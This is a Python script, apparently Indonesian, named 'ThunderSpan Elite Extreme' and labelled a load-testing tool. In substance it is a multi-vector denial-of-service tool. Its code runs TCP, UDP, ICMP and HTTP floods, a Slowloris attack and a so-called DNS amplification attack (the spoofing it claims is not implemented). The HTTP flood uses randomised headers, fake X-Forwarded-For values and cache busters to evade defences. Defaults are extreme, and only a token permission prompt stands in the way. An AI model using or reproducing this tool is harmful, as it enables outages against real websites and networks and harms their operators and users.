import threading
import requests
import time
import random
import argparse
from urllib.parse import urlparse, urlunparse
import socket
import sys
import os
from datetime import datetime
import ssl
import urllib3
import struct

# Nonaktifkan peringatan SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Variabel global untuk mengontrol eksekusi
is_running = True
stats_lock = threading.Lock()
request_counters = {}
success_count = 0
failure_count = 0
tcp_packets = 0
udp_packets = 0
slowloris_count = 0
icmp_packets = 0
dns_packets = 0

# Daftar User-Agent untuk divariasikan
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36"
]

# Daftar referer untuk divariasikan
REFERERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://www.yahoo.com/",
    "https://www.facebook.com/", "https://www.twitter.com/", "https://www.reddit.com/",
    "https://www.linkedin.com/", "https://www.instagram.com/", "https://www.tiktok.com/",
    "https://www.pinterest.com/", "https://www.tumblr.com/", "https://www.wikipedia.org/"
]

# ANSI color codes
COLORS = {
    "RED": "\033[91m", "GREEN": "\033[92m", "YELLOW": "\033[93m", "BLUE": "\033[94m",
    "PURPLE": "\033[95m", "CYAN": "\033[96m", "WHITE": "\033[97m", "RESET": "\033[0m",
    "BOLD": "\033[1m", "UNDERLINE": "\033[4m"
}

def print_banner():
    """Menampilkan banner ThunderSpan Elite Extreme"""
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""
{COLORS['RED']}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗
{COLORS['RED']}║                                                                                                          ║
{COLORS['RED']}║  {COLORS['PURPLE']}████████╗██╗  ██╗███╗   ██╗██████╗ ███████╗███████╗███████╗{COLORS['RED']}            ║
{COLORS['RED']}║  {COLORS['PURPLE']}╚══██╔══╝██║  ██║████╗  ██║██╔══██╗██╔════╝██╔════╝██╔════╝{COLORS['RED']}            ║
{COLORS['RED']}║  {COLORS['PURPLE']}   ██║   ███████║██╔██╗ ██║██║  ██║█████╗  ███████╗███████╗{COLORS['RED']}            ║
{COLORS['RED']}║  {COLORS['PURPLE']}   ██║   ██╔══██║██║╚██╗██║██║  ██║██╔══╝  ╚════██║╚════██║{COLORS['RED']}            ║
{COLORS['RED']}║  {COLORS['PURPLE']}   ██║   ██║  ██║██║ ╚████║██████╔╝███████╗███████║███████║{COLORS['RED']}            ║
{COLORS['RED']}║  {COLORS['PURPLE']}   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚══════╝╚══════╝{COLORS['RED']}            ║
{COLORS['RED']}║  {COLORS['RED']}███████╗██╗     ██╗███████╗████████╗███████╗ {COLORS['CYAN']}███████╗{COLORS['RED']}     ║
{COLORS['RED']}║  {COLORS['RED']}██╔════╝██║     ██║██╔════╝╚══██╔══╝██╔════╝ {COLORS['CYAN']}██╔════╝{COLORS['RED']}     ║
{COLORS['RED']}║  {COLORS['RED']}█████╗  ██║     ██║█████╗     ██║   █████╗   {COLORS['CYAN']}█████╗  {COLORS['RED']}     ║
{COLORS['RED']}║  {COLORS['RED']}██╔══╝  ██║     ██║██╔══╝     ██║   ██╔══╝   {COLORS['CYAN']}██╔══╝  {COLORS['RED']}     ║
{COLORS['RED']}║  {COLORS['RED']}███████╗███████╗██║███████╗   ██║   ███████╗ {COLORS['CYAN']}███████╗{COLORS['RED']}     ║
{COLORS['RED']}║  {COLORS['RED']}╚══════╝╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝ {COLORS['CYAN']}╚══════╝{COLORS['RED']}     ║
{COLORS['RED']}║                                                                                                          ║
{COLORS['RED']}║         {COLORS['CYAN']}>>> ThunderSpan Elite Extreme -- by -- PHΛNTØM <<<{COLORS['RED']}                ║
{COLORS['RED']}║     {COLORS['YELLOW']}Ultimate Multi-Vector Load Testing Tool (HTTP/TCP/UDP/ICMP/DNS){COLORS['RED']}     ║
{COLORS['RED']}║                                                                                                          ║
{COLORS['RED']}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝{COLORS['RESET']}
"""
    print(banner)

def print_status(target, duration, config):
    """Menampilkan status konfigurasi"""
    print(f"{COLORS['GREEN']}[+] Target: {COLORS['WHITE']}{target}{COLORS['RESET']}")
    print(f"{COLORS['GREEN']}[+] Duration: {COLORS['WHITE']}{duration}s ({duration/3600:.1f}h){COLORS['RESET']}")
    print(f"{COLORS['GREEN']}[+] Threads: {COLORS['WHITE']}HTTP={config['http_threads']}, TCP={config['tcp_threads']}, UDP={config['udp_threads']}{COLORS['RESET']}")
    print(f"{COLORS['GREEN']}[+] Threads: {COLORS['WHITE']}Slowloris={config['slowloris_threads']}, ICMP={config['icmp_threads']}, DNS={config['dns_threads']}{COLORS['RESET']}")
    print(f"{COLORS['GREEN']}[+] Ports: {COLORS['WHITE']}{config['ports']}{COLORS['RESET']}")
    print(f"{COLORS['GREEN']}[+] Method: {COLORS['WHITE']}{config['method']}{COLORS['RESET']}")
    print(f"{COLORS['GREEN']}[+] Data Size: {COLORS['WHITE']}{config['data_size']}b, Packet Size: {COLORS['WHITE']}{config['packet_size']}b{COLORS['RESET']}")
    print(f"{COLORS['GREEN']}[+] Delay: {COLORS['WHITE']}{config['delay']}s{COLORS['RESET']}")
    print(f"{COLORS['GREEN']}[+] Start Time: {COLORS['WHITE']}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{COLORS['RESET']}")
    print(f"{COLORS['YELLOW']}="*80 + f"{COLORS['RESET']}")

def print_stats(start_time, duration):
    """Menampilkan statistik secara real-time"""
    global success_count, failure_count, tcp_packets, udp_packets, slowloris_count, icmp_packets, dns_packets
    
    while is_running:
        elapsed = time.time() - start_time
        if duration > 0 and elapsed >= duration:
            break
            
        remaining = duration - elapsed if duration > 0 else float('inf')
        
        with stats_lock:
            total_requests = sum(request_counters.values())
            rps = total_requests / elapsed if elapsed > 0 else 0
            
            # Clear line and print stats
            sys.stdout.write("\033[2K\033[G")  # Clear line and move cursor to beginning
            sys.stdout.write(
                f"{COLORS['CYAN']}[STATS] {COLORS['WHITE']}Elapsed: {elapsed:.0f}s, "
                f"Remaining: {remaining:.0f}s, "
                f"HTTP: {total_requests} ({rps:.1f}/s), "
                f"Success: {success_count}, "
                f"Failed: {failure_count}, "
                f"TCP: {tcp_packets}, "
                f"UDP: {udp_packets}, "
                f"ICMP: {icmp_packets}, "
                f"DNS: {dns_packets}, "
                f"Slowloris: {slowloris_count}{COLORS['RESET']}"
            )
            sys.stdout.flush()
        
        time.sleep(1)
    
    # Clear the stats line when done
    sys.stdout.write("\033[2K\033[G")
    sys.stdout.flush()

def generate_random_headers(target_url):
    """Membuat header HTTP dengan nilai acak untuk mempersulit caching"""
    parsed_url = urlparse(target_url)
    
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Referer": random.choice(REFERERS),
        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    }
    
    # Tambahkan parameter acak ke URL untuk bypass cache
    url_parts = list(parsed_url)
    query = url_parts[4]
    if query:
        query += f"&cache_buster={random.randint(0, 1000000)}"
    else:
        query = f"cache_buster={random.randint(0, 1000000)}"
    url_parts[4] = query
    final_url = urlunparse(url_parts)
    
    return final_url, headers

def tcp_flood(target, port, thread_id, duration, packet_size):
    """Melakukan TCP flood attack"""
    global is_running, tcp_packets
    start_time = time.time()
    
    while is_running and (duration == 0 or (time.time() - start_time) < duration):
        try:
            # Buat socket baru untuk setiap koneksi
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target, port))
            
            # Kirim data acak
            s.send(b"X" * packet_size)
            
            with stats_lock:
                tcp_packets += 1
            
            # Tutup koneksi
            s.close()
            
        except Exception as e:
            try:
                s.close()
            except:
                pass

def udp_flood(target, port, thread_id, duration, packet_size):
    """Melakukan UDP flood attack"""
    global is_running, udp_packets
    start_time = time.time()
    
    while is_running and (duration == 0 or (time.time() - start_time) < duration):
        try:
            # Buat socket UDP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Kirim data acak
            s.sendto(b"X" * packet_size, (target, port))
            
            with stats_lock:
                udp_packets += 1
            
            # Tutup koneksi
            s.close()
            
        except Exception as e:
            try:
                s.close()
            except:
                pass

def icmp_flood(target, thread_id, duration, packet_size):
    """Melakukan ICMP flood attack"""
    global is_running, icmp_packets
    start_time = time.time()
    
    # Buat raw socket untuk ICMP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print(f"{COLORS['RED']}[!] ICMP flood requires root privileges! Skipping...{COLORS['RESET']}")
        return
    
    # Buat packet ICMP (ping)
    def create_icmp_packet():
        header = struct.pack('!BBHHH', 8, 0, 0, 0, 0)
        data = b'X' * packet_size
        checksum = 0
        # Calculate checksum
        for i in range(0, len(header) + len(data), 2):
            if i + 1 < len(header):
                word = (header[i] << 8) + header[i + 1]
                checksum += word
            elif i < len(header):
                word = header[i] << 8
                checksum += word
            else:
                word = (data[i - len(header)] << 8) + data[i - len(header) + 1]
                checksum += word
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum += checksum >> 16
        checksum = ~checksum & 0xffff
        header = struct.pack('!BBHHH', 8, 0, checksum, 0, 0)
        return header + data
    
    while is_running and (duration == 0 or (time.time() - start_time) < duration):
        try:
            # Kirim packet ICMP
            packet = create_icmp_packet()
            s.sendto(packet, (target, 0))
            
            with stats_lock:
                icmp_packets += 1
                
        except Exception as e:
            pass
    
    s.close()

def dns_amplification(target, dns_server, thread_id, duration):
    """Melakukan DNS amplification attack"""
    global is_running, dns_packets
    start_time = time.time()
    
    # Buat DNS query (ANY request untuk domain besar)
    dns_query = bytearray()
    # DNS header
    dns_query.extend(struct.pack('!HHHHHH', random.randint(0, 65535), 0x0100, 1, 0, 0, 0))
    # Query for isc.org (large response)
    dns_query.extend(b'\x03isc\x03org\x00')
    # Type ANY, Class IN
    dns_query.extend(struct.pack('!HH', 0x00ff, 0x0001))
    
    while is_running and (duration == 0 or (time.time() - start_time) < duration):
        try:
            # Buat socket UDP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            
            # Kirim DNS query ke server dengan spoofed source IP (target)
            s.sendto(dns_query, (dns_server, 53))
            
            with stats_lock:
                dns_packets += 1
            
            s.close()
            
        except Exception as e:
            try:
                s.close()
            except:
                pass

def slowloris_attack(target, port, thread_id, duration, use_ssl):
    """Melakukan Slowloris attack"""
    global is_running, slowloris_count
    start_time = time.time()
    
    # Parse target
    parsed_url = urlparse(target)
    host = parsed_url.netloc
    path = parsed_url.path if parsed_url.path else "/"
    
    # Header untuk Slowloris
    headers = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "Connection: keep-alive\r\n"
        "Keep-Alive: 900\r\n"
    )
    
    sockets = []
    
    try:
        while is_running and (duration == 0 or (time.time() - start_time) < duration):
            try:
                # Buat socket baru
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                
                if use_ssl:
                    # Bungkus dengan SSL jika diperlukan
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    s = context.wrap_socket(s, server_hostname=host)
                
                # Hubungkan ke server
                s.connect((host, port))
                
                # Kirim header secara partial
                s.send(headers.encode())
                sockets.append(s)
                
                with stats_lock:
                    slowloris_count += 1
                
            except Exception as e:
                # Jika gagal membuat koneksi, coba lagi
                pass
            
            # Jaga beberapa koneksi terbuka
            if len(sockets) >= 100:
                # Tutup beberapa koneksi lama
                for i in range(10):
                    if sockets:
                        try:
                            s = sockets.pop(0)
                            s.close()
                        except:
                            pass
            
            time.sleep(1)
            
    except Exception as e:
        pass
    
    # Tutup semua socket
    for s in sockets:
        try:
            s.close()
        except:
            pass

def http_attack(target_url, thread_id, duration, method, delay, use_ssl, data_size):
    """Fungsi yang dijalankan oleh setiap thread"""
    global is_running, success_count, failure_count
    request_counters[thread_id] = 0
    start_time = time.time()
    
    # Tentukan skema URL berdasarkan use_ssl
    parsed_url = urlparse(target_url)
    if use_ssl:
        target_url = f"https://{parsed_url.netloc}{parsed_url.path}"
    else:
        target_url = f"http://{parsed_url.netloc}{parsed_url.path}"
    
    while is_running and (duration == 0 or (time.time() - start_time) < duration):
        try:
            # Generate headers dan URL baru untuk setiap request
            url_with_cache_buster, headers = generate_random_headers(target_url)
            
            # Kirim request berdasarkan method
            if method == "POST":
                # Untuk POST, kirim data besar
                dummy_data = {"data": "X" * data_size}
                response = requests.post(url_with_cache_buster, headers=headers, data=dummy_data, 
                                        timeout=5, verify=False)
            elif method == "HEAD":
                response = requests.head(url_with_cache_buster, headers=headers, 
                                        timeout=5, verify=False)
            else:  # GET (default)
                response = requests.get(url_with_cache_buster, headers=headers, 
                                       timeout=5, verify=False)
            
            request_counters[thread_id] += 1
            
            with stats_lock:
                success_count += 1

        except requests.exceptions.RequestException as e:
            with stats_lock:
                failure_count += 1
        
        # Jeda antar request jika diatur
        if delay > 0:
            time.sleep(delay)

def main():
    global is_running
    
    # Setup command line arguments dengan nilai default yang lebih ekstrem
    parser = argparse.ArgumentParser(description='ThunderSpan Elite Extreme - Ultimate Multi-Vector Load Testing Tool')
    parser.add_argument('target', help='Target URL atau IP address')
    parser.add_argument('-t', '--http-threads', type=int, default=2000, help='Jumlah thread HTTP (default: 2000)')
    parser.add_argument('-tp', '--tcp-threads', type=int, default=500, help='Jumlah thread TCP (default: 500)')
    parser.add_argument('-u', '--udp-threads', type=int, default=500, help='Jumlah thread UDP (default: 500)')
    parser.add_argument('-s', '--slowloris-threads', type=int, default=100, help='Jumlah thread Slowloris (default: 100)')
    parser.add_argument('-i', '--icmp-threads', type=int, default=100, help='Jumlah thread ICMP (default: 100)')
    parser.add_argument('-dns', '--dns-threads', type=int, default=50, help='Jumlah thread DNS (default: 50)')
    parser.add_argument('-d', '--duration', type=int, default=21600, help='Durasi testing dalam detik (default: 21600 = 6 jam)')
    parser.add_argument('-dly', '--delay', type=float, default=0.00001, help='Jeda antar permintaan dalam detik (default: 0.00001)')
    parser.add_argument('-m', '--method', choices=['GET', 'POST', 'HEAD'], default='GET', help='HTTP method (default: GET)')
    parser.add_argument('-p', '--ports', type=str, default='80,443,8080', help='Ports untuk TCP/UDP flood (default: 80,443,8080)')
    parser.add_argument('-ds', '--data-size', type=int, default=2048, help='Ukuran data untuk POST requests (default: 2048 bytes)')
    parser.add_argument('-ps', '--packet-size', type=int, default=1024, help='Ukuran paket untuk TCP/UDP/ICMP flood (default: 1024 bytes)')
    parser.add_argument('-dns-srv', '--dns-server', type=str, default='8.8.8.8', help='DNS server untuk amplification (default: 8.8.8.8)')
    parser.add_argument('--no-ssl', action='store_true', help='Gunakan HTTP instead of HTTPS')
    parser.add_argument('--infinite', action='store_true', help='Jalankan tanpa henti (hingga dihentikan manual)')
    
    args = parser.parse_args()
    
    # Jika infinite mode, set duration ke 0
    if args.infinite:
        args.duration = 0
    
    # Parse ports
    ports = [int(p.strip()) for p in args.ports.split(',')]
    
    # Konfigurasi
    config = {
        'http_threads': args.http_threads,
        'tcp_threads': args.tcp_threads,
        'udp_threads': args.udp_threads,
        'slowloris_threads': args.slowloris_threads,
        'icmp_threads': args.icmp_threads,
        'dns_threads': args.dns_threads,
        'method': args.method,
        'ports': ports,
        'data_size': args.data_size,
        'packet_size': args.packet_size,
        'delay': args.delay
    }
    
    # Tampilkan banner
    print_banner()
    
    # Parse target
    if '://' in args.target:
        parsed_url = urlparse(args.target)
        target_host = parsed_url.netloc
        target_url = args.target
    else:
        target_host = args.target
        target_url = f"http://{args.target}"
    
    # Tampilkan status konfigurasi
    print_status(target_url, args.duration, config)
    
    # PERINGATAN KEAMANAN
    print(f"{COLORS['RED']}[!] PERINGATAN: Hanya gunakan alat ini pada sistem yang Anda miliki atau")
    print(f"[!] dengan izin tertulis yang jelas dari pemilik sistem.")
    print(f"[!] Menggunakannya tanpa izin adalah TINDAKAN ILEGAL.{COLORS['RESET']}")
    print(f"{COLORS['YELLOW']}="*80 + f"{COLORS['RESET']}")
    
    confirm = input(f"{COLORS['YELLOW']}[?] Apakah Anda yakin target adalah server LAB ANDA SENDIRI dan Anda memiliki IZIN? (y/N): {COLORS['RESET']}")

    if confirm.lower() != 'y':
        print(f"{COLORS['RED']}[!] Dibatalkan. Script tidak dijalankan.{COLORS['RESET']}")
        exit(0)

    print(f"{COLORS['GREEN']}[+] Memulai ThunderSpan Elite Extreme load test... (Tekan Ctrl+C untuk menghentikan){COLORS['RESET']}")
    start_time = time.time()

    # Jalankan thread untuk menampilkan statistik
    stats_thread = threading.Thread(target=print_stats, args=(start_time, args.duration))
    stats_thread.daemon = True
    stats_thread.start()

    # Jalankan semua thread attack
    threads = []
    
    # HTTP threads
    for i in range(args.http_threads):
        thread = threading.Thread(
            target=http_attack, 
            args=(target_url, i, args.duration, args.method, args.delay, not args.no_ssl, args.data_size)
        )
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # TCP threads (untuk setiap port)
    for port in ports:
        for i in range(args.tcp_threads):
            thread = threading.Thread(
                target=tcp_flood, 
                args=(target_host, port, i, args.duration, args.packet_size)
            )
            thread.daemon = True
            threads.append(thread)
            thread.start()

    # UDP threads (untuk setiap port)
    for port in ports:
        for i in range(args.udp_threads):
            thread = threading.Thread(
                target=udp_flood, 
                args=(target_host, port, i, args.duration, args.packet_size)
            )
            thread.daemon = True
            threads.append(thread)
            thread.start()

    # ICMP threads
    for i in range(args.icmp_threads):
        thread = threading.Thread(
            target=icmp_flood, 
            args=(target_host, i, args.duration, args.packet_size)
        )
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # DNS amplification threads
    for i in range(args.dns_threads):
        thread = threading.Thread(
            target=dns_amplification, 
            args=(target_host, args.dns_server, i, args.duration)
        )
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # Slowloris threads
    for i in range(args.slowloris_threads):
        thread = threading.Thread(
            target=slowloris_attack, 
            args=(target_url, ports[0], i, args.duration, not args.no_ssl)
        )
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # Tunggu sampai durasi selesai atau Ctrl+C
    try:
        if args.duration > 0:
            # Hitung mundur waktu
            remaining = args.duration
            while remaining > 0 and is_running:
                time.sleep(1)
                remaining -= 1
        else:
            # Infinite mode - tunggu hingga dihentikan manual
            while is_running:
                time.sleep(1)
                
    except KeyboardInterrupt:
        print(f"\n{COLORS['YELLOW']}[!] Diterima Ctrl+C. Menghentikan semua thread...{COLORS['RESET']}")
        is_running = False
        
    # Tunggu semua thread selesai
    for thread in threads:
        thread.join(timeout=5)
        
    end_time = time.time()
    total_time = end_time - start_time
    total_requests = sum(request_counters.values())
    
    # Tampilkan hasil akhir
    print(f"\n{COLORS['GREEN']}="*80)
    print(f"[+] ThunderSpan Elite Extreme test selesai!")
    print(f"[+] Waktu total: {total_time:.2f} detik.")
    print(f"[+] Total HTTP requests: {total_requests}")
    print(f"[+] Success requests: {success_count}")
    print(f"[+] Failed requests: {failure_count}")
    print(f"[+] TCP packets sent: {tcp_packets}")
    print(f"[+] UDP packets sent: {udp_packets}")
    print(f"[+] ICMP packets sent: {icmp_packets}")
    print(f"[+] DNS packets sent: {dns_packets}")
    print(f"[+] Slowloris connections: {slowloris_count}")
    print(f"[+] Requests per detik: {total_requests/total_time:.2f}")
    print(f"[+] End Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*80 + f"{COLORS['RESET']}")

if __name__ == "__main__":
    main()